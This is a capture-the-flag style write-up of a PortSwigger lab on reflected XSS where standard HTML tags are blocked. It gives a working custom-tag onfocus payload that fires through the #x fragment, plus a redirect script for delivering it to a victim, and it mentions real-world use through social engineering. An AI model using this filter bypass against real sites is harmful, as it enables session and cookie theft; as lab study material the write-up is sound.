## 1Ô∏è‚É£ General Information

|Element|Details|
|---|---|
|**Lab Link**|[HTML context with all standard tags blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)|
|**Solution Date**|2 / 5 / 2025|
|**Vulnerability Type**|Reflected Cross-Site Scripting (XSS)|

## üî∞ Lab Description

- This lab blocks the use of all standard HTML elements (standard tags) like `<script>`, `<img>`, etc.
    
- Only **custom HTML elements (custom tags)** are allowed.
    
- The goal is to execute an XSS attack that displays `alert(document.cookie)` **automatically** without user interaction.
    

---

## 2Ô∏è‚É£ Understanding the Lab Scenario

- The website contains a **search** box, and when a word is entered, it is displayed within the results page.

- Any input is displayed within the page without proper escaping.
    
- However, the filter blocks all standard tags, forcing us to use a **custom tag**.

## ‚ùì What is a Custom Tag?

- It's a non-standard HTML element, also known as a **custom element**, used within Web Components.
    
- Its name must contain a **dash `-`** like: `<my-element>`, to avoid conflicts with native HTML elements.
    
- It can carry attributes and events just like any other HTML element.
    

üß™ **Example:**

```html
<xss id="x" tabindex="1" onfocus="alert(document.cookie)">#x</xss>
```

## 3Ô∏è‚É£ Payload Analysis

```html
<xss id="x" tabindex="1" onfocus="alert(document.cookie)">#x</xss>
```

|Part|Explanation|
|---|---|
|`<xss>`|Unfiltered custom element.|
|`id="x"`|Used to access the element via fragment (`#x`).|
|`tabindex="1"`|Makes the element focusable.|
|`onfocus="alert(...)"`|Code executes when the element receives focus.|
|`#x`|Text displayed inside the element, helping it appear within the page.|

---

## 4Ô∏è‚É£ Automatic Code Execution Mechanism

When visiting a URL containing:

```txt
#x
```

The browser automatically:

1. Searches for the element with `id="x"`.
    
2. Performs an **automatic focus** on it.
    
3. Since the element contains `onfocus=alert(...)` ‚Üí the code executes immediately.
    

‚úÖ **Result:** XSS is triggered without any victim interaction.

## 5Ô∏è‚É£ Complete Code for Automatic Execution

```html
<script>
location = "https://TARGET-LAB/?search=<xss id=x tabindex=1 onfocus=alert(document.cookie)>#x"
</script>
```

### üîç Code Explanation:

|Element|Explanation|
|---|---|
|`<script>`|JavaScript element that executes immediately when the page loads.|
|`location =`|Automatically redirects the browser to a URL containing the payload.|
|`?search=...`|The vulnerable parameter that displays its contents within the page without escaping.|
|`#x`|Fragment that directs the browser to the element with `id="x"`, giving it focus, which triggers `onfocus`.|

---

## 6Ô∏è‚É£ Why Use `location` in a Separate Script?

- Some labs require the XSS to be executed **in the full context of the victim**.
    
- A redirect page containing the previous script is created.
    
- When the victim visits the page, they are automatically redirected to the vulnerable URL and the code executes.
    

---

## 7Ô∏è‚É£ Security Benefits of This Method

- **Bypasses filters** that block elements like `<script>`, `<img>`, `onerror`, etc.
    
- **Simple** and can be exploited even if protection only relies on blocking standard tags.
    
- Can be used in **real** scenarios if the user visits a controlled link (social engineering).

## ‚úÖ Quick Summary

|Element|Function|
|---|---|
|`<xss>`|Unfiltered custom element.|
|`id="x"`|To identify the element via `#x`.|
|`tabindex=1`|Makes the element focusable.|
|`onfocus=...`|Triggers code when the element receives focus.|
|`#x`|Forces the browser to automatically focus on the element.|
|`location=`|Automatically redirects the user to the vulnerable URL.|
